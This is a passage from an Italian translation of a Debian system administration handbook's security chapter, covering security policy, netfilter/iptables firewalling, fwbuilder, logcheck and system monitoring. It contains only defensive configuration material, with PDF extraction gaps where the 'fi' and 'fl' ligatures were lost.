                    Sicurezza
                                                                                                   Capitolo 14
                    14. Amministrazione avanzata                                                                 pag. 375
                           1. Come de nire una Security Policy (Politica di Sicurezza)                           pag. 376
                           2. Firewall o Packet Filtering                                                        pag. 377
                                    1. Come funziona Net lter                                                    pag. 378
                                    2. Sintassi di iptables e ip6tables                                          pag. 380
                                              1. I comandi                                                       pag. 380
                                              2. Le regole                                                       pag. 381
                                    3. Creazione delle regole                                                    pag. 381
                                    4. Come installare le regole in modo che vengano riprodotte ad ogni          pag. 383
                                    avvio
                           3. Supervisione: prevenzione, rilevamento, dissuasione                                pag. 383
                                    1. Monitoraggio dei logs con logcheck                                        pag. 383
                                    2. Monitoraggio delle attività                                               pag. 384
                                              1. In tempo reale                                                  pag. 384
                                              2. Storico                                                         pag. 385
                                    3. Rilevamento delle modi che                                                pag. 385
                                              1. La validazione dei pacchetti tramite il comando dpkg --         pag. 386
                                              verify
                                              2. Veri ca dei pacchetti con debsums nonostante i suoi limiti      pag. 387
                                              3. Monitoraggio dei les: AIDE                                      pag. 387
                                              4. Intrusion Detection System/Network Detection System             pag. 388
                                              (IDS/NIDS)
                           4. Introduzione ad AppArmor                                                           pag. 389
                                    1. I principi                                                                pag. 389
                                    2. Come attivare AppArmor e gestire i pro li AppArmor                        pag. 390
                                    3. Come creare un nuovo pro lo                                               pag. 391
                           5. Introduzione a SELinux                                                             pag. 397
                                    1. I principi                                                                pag. 397
                                    2. Come con gurare SELinux                                                   pag. 399
                                    3. Come gestire un sistema SELinux                                           pag. 400
                                              1. Gestione dei moduli SELinux                                     pag. 401
                                              2. Gestione delle identità                                         pag. 401
                                              3. Gestione di File Contexts, Ports e Booleans                     pag. 402
                                    4. Adeguamento delle Regole                                                  pag. 403
                                              1. Come scrivere un le .fc                                         pag. 403
                                              2. Come scrivere un le .if                                         pag. 404
                                              3. Come scrivere un le .te                                         pag. 405
                                              4. Compilazione dei les                                            pag. 409
                           6. Altre considerazioni sulla sicurezza                                               pag. 409
                                    1. I rischi dovuti alle applicazioni web                                     pag. 409
                                    2. Sapere cosa aspettarsi                                                    pag. 409
                                    3. Scegliere il software con prudenza                                        pag. 411
                                    4. Gestire una macchina nel suo insieme                                      pag. 411
                                    5. Gli utenti sono Giocatori/Attori                                          pag. 412
                                    6. Sicurezza sica                                                            pag. 412
                                    7. Responsabilità legale                                                     pag. 413
                           7. Come comportarsi con una macchina compromessa                                      pag. 413
                                    1. Rilevamento ed analisi dell’intrusione del Cracker                        pag. 413
                                    2. Mettere il server of ine                                                  pag. 414
                                    3. Preservare tutto ciò che può costituire una prova                         pag. 414
                                    4. Reinstallazione                                                           pag. 415
                                    5. Analisi forense                                                           pag. 415
                                    6. Ricostruzione dello scenario di un attacco                                pag. 416

                    << Un sistema informativo a seconda del contesto in cui viene utilizzato può avere un livello di
                    rilevanza differente. Difatti in alcuni casi è fondamentale per la sopravvivenza di una società. Di
                    conseguenza necessita della dovuta protezione per scongiurare diversi rischi. Il processo di
                    valutazione dei rischi, che comprende anche la de nizione e l’implementazione dei sistemi di
                    protezione, viene comunemente de nito come “security process” (in ital. trad. non lett. “processo di
                    prevenzione e di gestione degli incidenti di sicurezza”). >>
fi
     fi
          fi
               fi
                          fi
                          fi
                               fi
                               fi
                               fi
                                    fi
                                         fl
                                              fi
                                                   fi
                                                        fi
                                                             fi
                                                                  fi
     14.1. Come de nire una Security Policy (Politica di Sicurezza)

          ATTENZIONE                 La sicurezza è un argomento talmente vasto e delicato, che non è possibile
                                     affrontarlo in modo esaustivo nella trattazione di un unico capitolo.Verranno
      Qual è lo scopo di
                                     pertanto delineati soltanto alcuni punti importanti e presentati alcuni strumenti e
      questo capitolo                metodi che possono essere utilizzati nel “security domain” [nella logica del primo
                                     ordine (il linguaggio formale di rappresentazione degli enunciati, delle relazioni e
                                     del ragionamento logico) il dominio è l’insieme degli oggetti di un modello, che a
                                     sua volta include non solo gli oggetti, ma anche le relazioni fra quest’ultimi]. Per chi
                                     fosse interessato, la documentazione sull’argomento è abbondante tanto che sono
                                     state scritte intere opere che lo trattano. Un eccellente punto di partenza è il libro
                                     Linux Server Security di Michael D. Bauer (pubblicato da O'Reilly).

     Il termine "sicurezza" comprende una vasta serie di concetti, strumenti e procedure, che non
     possono singolarmente essere applicati universalmente. Scegliere quale implementare richiede una
     consapevolezza riguardo al ne da raggiungere. Ovvero per proteggere un sistema occorre porsi in
     fase ex ante alcune domande. Difatti con la mera implementazione arbitraria degli strumenti
     difensivi senza piani cazione si rischia il paradosso dell’assenza di sicurezza riguardo ad aspetti
     rilevanti.

     Per prima cosa dovrete porvi un obiettivo. Le seguenti domande potrebbero aiutarvi a tale scopo:
     • Cosa desiderate proteggere? La politica di sicurezza non può essere universale e cambia in base a
     cosa si sta cercando di proteggere, ad esempio un computer o dei dati. E se si tratta di dati, la politica
     di sicurezza cambia anche in base al tipo di dati.
     • Da quale “incidente di sicurezza” desiderate proteggervi? Un furto di dati riservati? Una
     perdita accidentale dei dati? Una perdita di entrate dovuta all'interruzione dei servizi offerti dalla
     vostra società?
     • Inoltre, da chi state cercando protezione? Le misure di sicurezza differiscono a seconda si tratti di
     un errore umano di un utente regolare del sistema [o impiegato] o di un attacco di un dato gruppo di
     malintenzionati.

     Il termine rischio viene normalmente associato a tre fattori: cosa deve essere protetto, quale
     evento si desidera scongiurare e chi potrebbe farlo accadere. Le risposte a queste tre domande
     consente di de nire un modello di rischio. Dopodiché sarà possibile stabilire una politica di sicurezza
     e concretizzare le dovute azioni.

                 NOTA                Bruce Schneier, un esperto di sicurezza riconosciuto a livello mondiale (non
                                     soltanto di sicurezza informatica) è solito sconfessare uno dei miti sulla sicurezza
      Un interrogativo
                                     con la seguente frase “La sicurezza è un processo, non un prodotto”. Ovvero le
      perpetuo                       risorse da proteggere cambiano con il trascorre degli anni così come le minacce ed i
                                     mezzi a disposizione dei malintenzionati. Quindi nonostante la presenza di una
                                     politica di sicurezza perfettamente progettata ed implementata, non potrete
                                     sentirvi mai completamente al sicuro. I fattori di rischio evolvono e la vostra
                                     controffensiva dovrà fare altrettanto.

     Nella de nizione di una politica di sicurezza dovrete tenere in considerazione i vincoli che possono
     limitarne l’applicabilità. Ovvero no a che punto siete disposti ad arrivare per mettere in sicurezza il
     vostro sistema? Tale domanda ha un impatto notevole riguardo all’implementazione di una politica
     di sicurezza. Spesso si è soliti credere che la risposta sia in uenzata soltanto dai costi economici,
     invece non è così dato che occorre valutare anche gli effetti negativi di una politica di sicurezza in
     termini di inconvenienti per gli utenti del sistema o di degradazione delle prestazioni.
     Pertanto si ribadisce che soltanto dopo aver de nito un modello di rischio potrete stabilire una
     politica di sicurezza ef ciente.

     Pagina 376 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
       fi
            fi
                 fi
                      fi
                           fi
                                fi
                                                 fi
                                                               fl
                             NOTA                          In alcuni casi la scelta delle azioni da intraprendere per proteggere un sistema può
                Politiche agli                             essere estremamente semplice.
                                                           Ad esempio, se il sistema da proteggere è costituito esclusivamente da un computer
                antipodi                                   di seconda mano utilizzato per i conteggi di ne giornata, potreste ragionevolmente
                                                           decidere di non fare nulla di speciale per la sua sicurezza. Infatti il valore
                                                           economico del sistema in sé è basso. Mentre quello dei dati è pari a zero in quanto
                                                           non vengono archiviati nel suddetto computer. Pertanto un potenziale malvivente
                                                           anche se riuscisse ad in ltrarsi nel “sistema” otterrebbe un’ingombrante
                                                           calcolatrice.
                                                           In conclusione il costo per la protezione di un sistema simile potrebbe di gran lunga
                                                           essere superiore al costo di un’eventuale violazione di sicurezza.
                                                           In altri casi potreste desiderare la protezione dei dati con denziali a discapito di
                                                           qualsiasi altra considerazione. Ovvero anche attraverso la distruzione completa dei
                                                           dati (rimozione sicura dei les, distruzione dell’hard disk facendolo a pezzi e
                                                           trattando poi i singoli pezzi con acido, ecc.). Diversamente se i dati devono essere
                                                           conservati per un loro possibile utilizzo in futuro (ma senza essere accessibili) ed il
                                                           costo della loro protezione non è soggetto a vincoli, si potrebbe optare per la loro
                                                           memorizzazione su dischi in lega di platino-iridio immagazzinati in bunker a prova
                                                           di bomba, scavati in diverse montagne sparse nel mondo, con segretazione della
                                                           loro posizione e sottoponendoli a vigilanza militare ...
                                                           Per quanto le politiche sopra descritte possano sembrare estreme, in realtà
                                                           rappresentano la risposta adeguata nella misura opportuna a dei rischi de niti,
                                                           tenuti in conto gli obiettivi da raggiungere ed i vincoli da rispettare. Solo la politica
                                                           di sicurezza derivante da una decisione ponderata potrà essere considerata degna
                                                           di rispetto.

               Nella maggior parte dei casi il sistema informativo è suddiviso in sottosistemi coerenti ed
               indipendenti. Ciascuno di questi sottosistemi ha dei requisiti e dei limiti a se stanti, di conseguenza
               ogni sottosistema necessita di una politica di sicurezza progettata ad hoc. Per fare ciò dovrete tenere
               presente il seguente principio: un perimetro breve e ben de nito è più facile da difendere da uno
               vasto e senza con ni. Persino l'organizzazione della rete dovrà essere progettata in base al suddetto
               principio: i servizi più sensibili dovranno essere concentrati su un numero ristretto di macchine e
               quest’ultime dovranno essere accessibili solo attraverso un numero inferiore di check-points; difatti
               la progettazione della protezione dei check-points sarà meno onerosa rispetto alla progettazione
               della sicurezza di ogni singola macchina sensibile da esporre ai rischi del mondo esterno. Per tali
               ragioni nel suddetto contesto sono adeguate soluzioni come il network ltering (che comprendono i
                 rewalls). Il network ltering può essere implementato sia da hardware dedicato, sia da software
                 rewalls, come quello integrato dal Linux kernel, che rappresentano soluzioni più semplici e
                 essibili.

               14.2. Firewall o Packet Filtering

                      BASILARE                             Un firewall è una componente, hardware e/o software, di un sistema informatico,
                                                           che veri ca i pacchetti della reta in entrata ed in uscita (provenienti da o destinati
                Firewall
                                                           alla rete locale) per poi lasciar giungere a destinazione solo quelli che soddisfano
                                                           determinate condizioni prede nite.

               Un rewall è un ltering network gateway ef cace solo sui pacchetti di rete che lo attraversano.
               Di conseguenza l’ef cienza di un rewall dipende dal fatto che i pacchetti vengano instradati
               attraversandolo.

                                                                                           TDAH_1.0       Capitolo XIV - Sicurezza Pagina 377
fi
fl
fi
     fi
          fi
                   fi
                        fi
                             fi
                                  fi
                                       fi
                                            fi
                                                 fi
                                                      fi
                                                               fi
                                                                    fi
                                                                             fi
                                                                                      fi
                                                                                               fi
                                                                                                    fi
           L'assenza di una con gurazione standard (ed il principio citato precedentemente “processo, non un
           prodotto”) spiega perché non esiste una soluzione pronta all'uso. In ogni caso esistono degli
           strumenti che, attraverso la rappresentazione gra ca delle regole di ltraggio, facilitano la
           con gurazione del rewall netfilter. Uno dei migliori è senza dubbio fwbuilder.

                   SPECIFIC CASE                         Potrete limitare l’azione di un rewall locale ad una singola macchina (e non ad
                 Local Firewall                          un’intera rete locale); il suo ruolo quindi sarà ltrare o impedire l'accesso ad alcuni
                                                         servizi, onde evitare che vengano instaurate connessioni in uscita da software
                                                         fraudolento installato volontariamente o involontariamente dall'utente.

           Il kernel Linux integra il rewall netfilter. Potrete gestirlo dall’user space attraverso i comandi
           iptables e ip6tables. La differenza tra questi due comandi è che il primo è destinato alle reti IPv4
           mentre il secondo alle reti IPv6. Dato che entrambi i due network protocol stacks saranno
           comunemente impiegati negli anni a venire, dovrete utilizzare in parallelo ambedue i sopracitati
           comandi.

           14.2.1. Come funziona Net lter

           netfilter utilizza quattro tabelle distinte in cui sono conservate le regole per gestire tre tipi di
           operazioni sui pacchetti:

           • filter [ ltro] riguarda le regole di ltraggio (ossia accetta, rifiuta o ignora un pacchetto);
           • nat riguarda la traduzione degli indirizzi IP di origine o di destinazione ed i ports dei pacchetti;
           • mangle per modi care i pacchetti IP (compresi il campo ToS — Type of service — e opzioni);
           • raw per modi care manualmente i pacchetti prima che raggiungano il connection tracking system.

           Ogni tabella contiene liste di regole che vengono denominate chains [catene]; il rewall utilizza le
           chains prede nite per gestire i pacchetti in circostanze prede nite. L'amministratore
           può creare altre chains, che verranno utilizzate solo se individuate da una delle chains prede nite
           (direttamente o indirettamente).

           La tabella filter ha tre chains standard:

           • INPUT: per i pacchetti destinati al rewall;
           • OUTPUT: per i pacchetti inviati dal rewall;
           • FORWARD: per i pacchetti in transito attraverso il rewall (quindi per i pacchetti che non sono stati
             inviati dal rewall o non sono destinati al rewall);

           La tabella nat ha anche tre chains standard:

           • PREROUTING: per modi care i pacchetti non appena arrivano;
           • POSTROUTING: per modi care i pacchetti quando sono pronti a raggiungere la loro destinazione;
           • OUTPUT: per modi care i pacchetti generati dallo stesso rewall.

           Pagina 378 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
      fi
            fi
                 fi
                      fi
                      fi
                           fi
                                fi
                                     fi
                                     fi
                                          fi
                                               fi
                                                    fi
                                                         fi
                                                              fi
                                                                   fi
                                                                        fi
                                                                             fi
                                                                                  fi
                                                                                       fi
                                                                                            fi
                                                                                                 fi
                                                                                                      fi
                                                                                                            fi
                                                                                                                          fi
                  Figura 14.1 Rappresentazione gra ca di come vengono richieste le chains di net lter

     Ogni chain è un elenco di regole; ciascuna regola de nisce una serie di condizioni e l’azione da
     eseguire se una condizione viene soddisfatta. Quando viene processato un pacchetto, il rewall
     consulta le chains, regola dopo regola; se le condizioni di una regola sono soddisfatte il rewall
     “jumps” [salta] (l'opzione -j è la lettera iniziale del termine inglese jump) all’azione correlata in
     modo che possa continuare a processare. Le funzionalità più comuni sono già standardizzate e le
     azioni correlate sono anch’esse disponibili. Se viene intrapresa un’azione prede nita si interrompe il
     processo della chain, dato che le sorti del pacchetto sono già stabilite (salvo le eccezioni citate a
     seguire):

               BASILARE          ICMP (Internet Control Message Protocol) è un protocollo impiegato per
      ICMP                       trasmettere le informazioni complementari sulle comunicazioni. Il suddetto
                                 protocollo consente di testare il funzionamento della connessione di rete attraverso
                                 il comando ping (che invia un messaggio di ICMP echo request in modo da
                                 ricevere dal destinatario un messaggio ICMP echo reply). Inoltre: avvisa se un
                                 pacchetto è stato ri utato da un rewall; indica un over ow [un sovracaricamento]
                                 del receive buffer [buffer di ricezione]; offre un instradamento migliore per i nuovi
                                 pacchetti in connessione; ecc. Il protocollo ICMP è stato de nito da diversi
                                 documenti RFC; i primi documenti RFC777 e RFC792, sono stati celermente
                                 integrati ed estesi.

                                   http://www.faqs.org/rfcs/rfc777.html
                                   http://www.faqs.org/rfcs/rfc792.html

                                 Si ricorda che un buffer di ricezione è una piccola area di memoria che immagazzina
                                 i dati nell’intervallo temporale compreso fra i due seguenti eventi: l’arrivo dei dati
                                 dalla rete; l’elaborazione dei dati da parte del kernel. Se la sopracitata area di
                                 memoria diventa piena non può ricevere altri dati, di conseguenza il protocollo
                                 ICMP segnala il problema al mittente in modo che quest’ultimo riduca il suo transfer
                                 rate (e così si raggiunga un equilibrio dopo un po’).
                                 In aggiunta si precisa che mentre una rete IPv4 può funzionare senza ICMP, una
                                 rete IPv6 necessità di ICMPv6 imprescindibilmente, dato che combina diverse
                                 funzionalità che nell’IPv4 erano gestite da ICMPv4, IGMP (Internet Group
                                 Membership Protocol) e ARP (Address Resolution Protocol).
                                 ICMPv6 è de nito nel documento RFC4443.

                                   http://www.faqs.org/rfcs/rfc4443.html

     • ACCEPT: consente al pacchetto di raggiungere la sua destinazione;

                                                                TDAH_1.0       Capitolo XIV - Sicurezza Pagina 379
fi
          fi
                       fi
                            fi
                                                fl
                                                     fi
                                                          fi
                                                                          fi
                                                                                  fi
                                                                                          fi
                                                                                               fi
                              • REJECT: ri uta il pacchetto segnalando un ICMP error packet (il tipo di errore da restituire può
                              essere con gurato attraverso l’opzione --reject-with type di iptables);
                              • DROP: cancella (ignora) il pacchetto;
                              • LOG: registra (tramite syslogd) un messaggio di log che include una descrizione del pacchetto
                              processato; si precisa che questa azione non interrompe il processo in corso e l'esecuzione della
                              chain continua alla regola successiva, pertanto per registrare un pacchetto ri utato occorre
                              con gurare entrambe le regole LOG e REJECT/DROP;
                              • ULOG: registra messaggio di log tramite ulogd, che è più ef ciente di syslogd nella gestione di
                              grandi quantità di messaggi (si precisa che questa azione come LOG non interrompe il processo in
                              corso e l'esecuzione della chain continua alla regola successiva);
                              • chain_name: salta ad una determinata chain richiesta e valuta le regole in essa contenute;
                              • RETURN: interrompe il processo della chain corrente e ritorna alla chain richiesta; qualora la chain
                              corrente fosse standard, e non ci fosse alcuna chain richiesta, verrebbe eseguita
                              l'azione prede nita (con gurabile attraverso l’opzione -P di iptables);
                              • SNAT (incluso solo nella tabella nat): applica Source NAT (le opzioni aggiuntive descrivono le
                              speci che modi che da apportare);
                              • DNAT (incluso solo nella tabella nat): applica Destination NAT (le opzioni aggiuntive descrivono
                              le speci che modi che da apportare);
                              • MASQUERADE (incluso solo nella tabella nat): applica il masquerading (è un caso speci co di
                              Source NAT);
                              • REDIRECT (incluso solo nella tabella nat): reindirizza un pacchetto ad un dato port del rewall
                              stesso; ciò può essere utile per la con gurazione di un transparent web proxy in grado di funzionare
                              senza con gurazione lato client, in modo che quest’ultimo si connetta attraversando
                              sistematicamente il proxy per giungere alla destinazione senza percepire la differenza con la
                              connessione diretta.

                              Altre azioni, in particolare quelle relative alla tabella mangle, esulano dallo scopo di questo manuale.
                              Per ottenere informazioni esaustive consultate le manpage di iptables(8) e ip6tables(8).

                              14.2.2. Sintassi di iptables e ip6tables

                              I comandi iptables e ip6tables consentono di gestire le tabelle, le chains e le regole. Attraverso
                              l’opzione -t table potrete immettere la tabella su cui intendete operare (la tabella prede nita è
                              filter).

                              14.2.2.1 I comandi

                              L'opzione -N chain crea una nuova chain; l'opzione -X chain rimuove una chain vuota ed
                              inutilizzata. L'opzione -A chain rule aggiunge una regola alla ne della chain speci cata. L'opzione
                              -I chain rule_num inserisce una regola prima della regola individuata e numerata attraverso
                              rulenum. L'opzione -D chain rule_num (o -D chain rule) rimuove una regola da una chain; la
                              prima sintassi identi ca la regola attraverso la sua posizione numerica, mentre la seconda sintassi
                              identi ca la regola dal suo contenuto. L'opzione -F chain svuota la chain (rimuove tutte le sue
                              regole); se non viene de nita nessuna chain tutte le regole della tabella sono cancellate. L'opzione -L
                              chain elenca le regole di una chain. In ne, l'opzione -P chain action con gura l'azione prede nita
                              (o una “policy”) per una data chain; occorre chiarire che solo le chains standard possono avere
                              azioni standard (o “policies”).

                              Pagina 380 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
          fi
               fi
                    fi
                         fi
                              fi
                                   fi
                                        fi
                                             fi
                                                  fi
                                                       fi
                                                            fi
                                                                 fi
                                                                      fi
                                                                                fi
                                                                                     fi
                                                                                              fi
                                                                                                   fi
                                                                                                        fi
                                                                                                             fi
                                                                                                                  fi
                                                                                                                       fi
                                                                                                                            fi
     14.2.2.2 Le regole

     Ciascuna regola è espressa come conditions -j action action_options Se diverse condizioni
     sono descritte nella stessa regola il criterio di applicazione è la congiunzione (logica and) [vedi note
     del capitolo V - pag. 76] che pone dei limiti come fa qualsiasi singola condizione.
     La condizione del -p protocol corrisponde al campo protocol (protocollo) del pacchetto IP. I valori
     più comuni sono tcp, udp, icmp e icmpv6. Se aggiungerete come pre sso alla condizione un punto
     esclamativo renderete la condizione negativa e verrà interpretata come “qualsiasi pacchetto purché
     abbia un protocollo speci cato differente rispetto alla condizione”. Il suddetto meccanismo che rende
     una condizione negativa può essere applicato a qualsiasi condizione e non soltanto a quella
     nell’esempio.

     La condizione -s address o -s network/mask corrisponde all'indirizzo di origine del pacchetto; la
     condizione -d address o -d network/mask corrisponde all'indirizzo di destinazione.

     La condizione -i interface seleziona i pacchetti in entrata dall'interfaccia di rete speci cata; la
     condizione -o interface seleziona i pacchetti in uscita verso l'interfaccia di rete speci cata.

     In realtà esistono condizioni più speci che, che dipendono dalle condizioni generiche descritte sopra.
     Ad esempio la condizione -p tcp potrebbe essere integrata da condizioni sui ports TCP come --
     source-port port e --destination-port port.

     La condizione --state state corrisponde allo stato del pacchetto in una connessione (si precisa
     che per tale condizione è necessario il modulo del kernel ipt_conntrack, che implementa il
     tracciamento della connessione). Lo stato NEW descrive un pacchetto che avvia una nuova
     connessione. Lo stato ESTABLISHED corrisponde ai pacchetti di una connessione già esistente e
     RELATED corrisponde ai pacchetti che avviano una nuova connessione correlata ad una connessione
     già esistente (ciò torna utile con le connessioni ftp-data in modalità “attiva” del protocollo FTP).

     Il precedente paragrafo descrive in dettaglio l'elenco delle potenziali azioni, ma non le rispettive
     opzioni. L'azione LOG ha ad esempio le seguenti opzioni:

     • --log-level, attraverso il valore prede nito warning, indica il livello di severità di syslog;
     • --log-prefix consente di speci care un pre sso testuale per differenziare i messaggi di log;
     • --log-tcp-sequence, --log-tcp-options e --log-ip-options sono utilizzate per integrare i
       dati aggiuntivi nel messaggio: rispettivamente il TCP sequence number, le opzioni TCP e le opzioni
       IP.

     L'azione DNAT supporta l'opzione --to-destination address:port per indicare il nuovo
     indirizzo IP e/o port di destinazione. Similmente l'azione SNAT supporta l'opzione --to-source
     address:port per indicare il nuovo indirizzo e/o port di origine.

     L'azione REDIRECT (accessibile solo se NAT è disponibile) supporta l’opzione --to-ports port(s)
     per speci care il port o l'intervallo di ports a cui reindirizzare i pacchetti.

     14.2.3. Creazione delle regole

     Per creare una nuova regola dovrete invocare (per ogni singola regola) iptables/ip6tables.
     Pertanto digitare i suddetti comandi manualmente potrebbe essere una scocciatura e per questo
     motivo solitamente le chiamate vengono conservate in uno script così che la con gurazione possa

                                                          TDAH_1.0     Capitolo XIV - Sicurezza Pagina 381
fi
                  fi
                            fi
                                 fi
                                      fi
                                           fi
                                                               fi
                                                                            fi
                                                                                   fi
                                                                                        fi
     essere riprodotta automaticamente ad ogni riavvio della macchina. Potrete scrivere lo script in
     questione manualmente, ma è preferibile prepararlo utilizzando uno strumento di alto livello come
     fwbuilder.

     # apt install fwbuilder

     Il principio è semplice. Nella prima fase dovrete descrivere tutti gli elementi compresi nelle regole
     effettive:

     • il rewall e le sue interfacce di rete;

     • le reti ed i corrispondenti intervalli IP;

     • i servers;

     • i ports appartenenti ai servizi ospitati sui diversi servers.

     Poi potrete creare le regole semplicemente trascinando e rilasciando le azioni sugli oggetti.
     Attraverso alcuni menu contestuali potrete modi care la condizione (ad esempio trasformandola in
     negativa). Dopodiché dovrete scegliere e con gurare l’azione desiderata.

     Visto che ormai l’IPv6 è oggetto di interesse, potrete creare due distinti rulesets per IPv4 e IPv6
     oppure potrete creare un solo ruleset per entrambi e lasciare che sia fwbuilder ad interpretare le
     regole in base agli indirizzi assegnati agli oggetti.

                                     Figura 14.2 La nestra principale di Fwbuilder

     Pagina 382 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
      fi
                                        fi
                                             fi
     fwbuilder potrà in ne generare uno script che con guri il rewall in base alle regole che avrete
     individuato. L'architettura modulare del suddetto strumento consente di generare scrips mirati per
     diversi sistemi (iptables per Linux, ipf per FreeBSD e pf per OpenBSD).

     14.2.4. Come installare le regole in modo che vengano riprodotte ad ogni avvio

     In alcuni casi, il modo più semplice è memorizzare lo script di con gurazione nella direttiva up del
      le /etc/network/interfaces. Nell'esempio seguente, lo script è stato conservato in
     /usr/local/etc/arrakis.fw.

                               Esempio 14.1 Il le interfaces che richiede lo script del rewall
     auto eth0
     iface eth0 inet static
         address 192.168.0.1
         network 192.168.0.0
         netmask 255.255.255.0
         broadcast 192.168.0.255
         up /usr/local/etc/arrakis.fw

     Si presuppone ovviamente che le interfacce di rete siano state con gurate con ifupdown. Se
     utilizzate un altro strumento (ad esempio NetworkManager o systemd-networkd), dovrete
     consultare la sua documentazione per eseguire lo script dopo che avrete riattivato l’interfaccia.

     14.3. Supervisione: prevenzione, rilevamento, dissuasione

     Il monitoraggio è parte integrante di qualsiasi politica di sicurezza per diverse ragioni. Difatti
     l’obiettivo di una politica di sicurezza non è soltanto garantire la riservatezza dei dati,
     ma anche la disponibilità dei servizi. Quindi dovrete assicurarvi che tutto funzioni come previsto,
     rilevare in tempi ragionevoli eventuali anomalie nel funzionamento o cambiamenti nella qualità dei
     servizi erogati. L'attività di monitoraggio può facilitare il rilevamento di tentativi di in ltrazione e
     pertanto consentirvi l’attuazione di una rapida controffensiva prima che si veri chino conseguenze
     gravi. Questo il capitolo tratterà alcuni strumenti che possono essere impiegati per monitorare
     diversi aspetti di un sistema Debian. Di fatto integra il paragrafo 12.4, "Monitoring [Monitoraggio o
     Supervisione]" a pagina 345.

     14.3.1. Monitoraggio dei logs con logcheck

     Il programma logcheck monitora i log les ogni ora per impostazione prede nita. Inoltre invia via e-
     mail i messaggi di logs più insoliti all’amministratore per un’analisi più accurata
     L'elenco dei les monitorati viene memorizzato nel le /etc/logcheck/logcheck.logfiles; non
     dovrete modi care i valori prede niti a meno che non abbiate modi cato radicalmente il le /etc/
     rsyslog.conf.

                                                                 TDAH_1.0        Capitolo XIV - Sicurezza Pagina 383
fi
     fi
          fi
               fi
                    fi
                          fi
                                     fi
                                                  fi
                                                       fi
                                                       fi
                                                            fi
                                                                  fi
                                                                       fi
                                                                            fi
                                                                                 fi
                                                                                      fi
                                                                                           fi
                                                                                                fi
          logcheck processa in 3 modalità (più o meno dettagliate): paranoid, server e workstation. La
          prima modalità è “verbose” (molto dettagliata), per cui è adatta a server dedicati (come i rewalls).
          La seconda modalità, abilitata per impostazione prede nita, è raccomandata per la maggior parte dei
          servers. La terza modalità è destinata alle workstations ed è la meno dettagliata (è la modalità che
           ltra più messaggi).

          Qualunque modalità venga scelta è consigliabile comunque con gurare logcheck per escludere i
          messaggi super ui (in base ai servizi installati), a meno che l’amministratore non desideri ricevere
          ad ogni ora una mole di emails inutili. La procedura di selezione dei messaggi è relativamente
          complessa ed in caso di necessità dovrete consultare /usr/share/doc/logcheck-database/
          README.logcheck-database.gz.

          Le regole possono essere distinte in diversi tipi:
          • quelle che quali cano un messaggio come un tentativo di cracking (vengono salvate in un le nella
          directory /etc/logcheck/cracking.d/);
          • quelle che si occupano della rimozione dei messaggi quali cati come tentativo di cracking (/etc/
          logcheck/cracking.ignore.d/);
          • quelle che quali cano un messaggio come avviso di sicurezza (/etc/logcheck/violations.d/);
          • quelle che si occupano della rimozione dei messaggi quali cati come avviso di sicurezza (/etc/
          logcheck/violations.ignore.d/);
          • ed in ne quelle che si applicano a tutti i restanti messaggi (quali cati come eventi di sistema).

                                   Qualsiasi messaggio contrassegnato come tentativo di cracking o avviso di
               ATTENZIONE
                                   sicurezza (a seguito ad esempio di una regola nel le /etc/logcheck/
           Come si ignora
                                   violations.d/myfile) può essere ignorato immettendo una regola nel le /etc/
           un messaggio            logcheck/violations.ignore.d/myfile o nel le /etc/logcheck/
                                   violations.ignore.d/myfile-extension.

          Un evento di sistema verrà sempre segnalato, a meno che una regola in una delle directories /etc/
          logcheck/ignore.d.{paranoid,server,workstation}/ non imponga di ignorarlo. Ovviamente
          solo le directories corrispondenti ad un livello di verbosità maggiore o uguale al livello della modalità
          operativa prescelta verranno prese in considerazione.

          14.3.2. Monitoraggio delle attività

          14.3.2.1. In tempo reale

          top è uno strumento interattivo che consente la visualizzazione dell'elenco dei processi correnti. Per
          impostazione prede nita organizza la sua tabella partendo dal carico corrente della CPU (che si può
          comunque richiedere attraverso il tasto P). In ogni caso è possibile richiedere la memoria occupata
          (tasto M), il total processor time (tasto T) o il numero identi cativo del processo o PID (tasto N).
          Attraverso il tasto k [che è la lettera iniziale del lemma inglese “kill”] potrete terminare un
          processo immettendo il suo numero identi cativo.
          Attraverso il tasto r [che è la lettera iniziale del lemma inglese “renicing”] potrete cambiare la
          priorità di un processo.

          Qualora il vostro sistema sembrasse sovraccarico, attraverso top potrete veri care quali processi
          sono in competizione per il processor time o quale consuma troppa memoria. Viene impiegato anche
          per valutare se i processi che consumano risorse corrispondono effettivamente a dei servizi reali che
          la macchina ospita. Ad esempio quando un processo sconosciuto è in esecuzione sotto l'utente www-
          data [in un web server] dovrebbe impensierirvi e dovreste valutarlo, in quanto è molto probabile

          Pagina 384 Il Manuale dell’Amministratore di Debian TDAH_1.0
fi
     fi
             fl
                  fi
                  fi
                       fi
                                         fi
                                              fi
                                                   fi
                                                        fi
                                                             fi
                                                             fi
                                                                  fi
                                                                       fi
                                                                            fi
                                                                                 fi
                                                                                      fi
                                                                                           fi
                                                                                                fi
che si tratti di un’istanza del software installato [e legittimo - come apache, nginx, ecc.] in
esecuzione però sulla macchina a causa di una vulnerabilità in un'applicazione web.
top è uno strumento molto essibile con una correlata man page che descrive come personalizzare
la visualizzazione in base alle proprie esigenze o agli usi.
Lo strumento con interfaccia gra ca gnome-system-monitor è simile a top ed offre
sostanzialmente le stesse funzionalità.

14.3.2.2 Storico

Il carico della CPU, il traf co di rete e lo spazio disponibile sul disco sono informazioni che
variano continuamente. L’analisi dello storico e di conseguenza dell’evoluzione delle suddette
informazioni è utile per individuare l’uso che viene fatto del computer.

Esistono diversi strumenti dedicati a questa attività. La maggior parte di questi strumenti raccoglie i
dati tramite SNMP (Simple Network Management Protocol) allo scopo di centralizzare le
informazioni. Ciò pertanto consente di recuperare anche le informazioni sugli elementi della rete che
non sono necessariamente computers di tipo general-purpose, ma ad esempio routers di rete dedicati
o switches.

Questo libro tratta in dettaglio Munin (andate a leggere il paragrafo 12.4.1, “Con gurazione di
Munin” a pagina 346) nel Capitolo 12: “Amministrazione avanzata” a pagina 302. Debian offre un
tool simile denominato cacti. Il suo deployment è leggermente più complesso, dato che si basa solo
su SNMP. Inoltre, nonostante offra un'interfaccia web, i concetti relativi alla sua con gurazione sono
poco intuitivi. La lettura della correlata documentazione HTML (/usr/share/doc/cacti/html/
index.html) è essenziale.

   ALTERNATIVA                   mrtg (incluso nell'omonimo pacchetto) è uno strumento avanti negli anni.
 mrtg                            Nonostante il pro lo spartano, mrtg è in grado di raccogliere gli storici dei dati e di
                                 presentarli sotto forma di gra ci. Supporta diversi scripts per visualizzare i dati
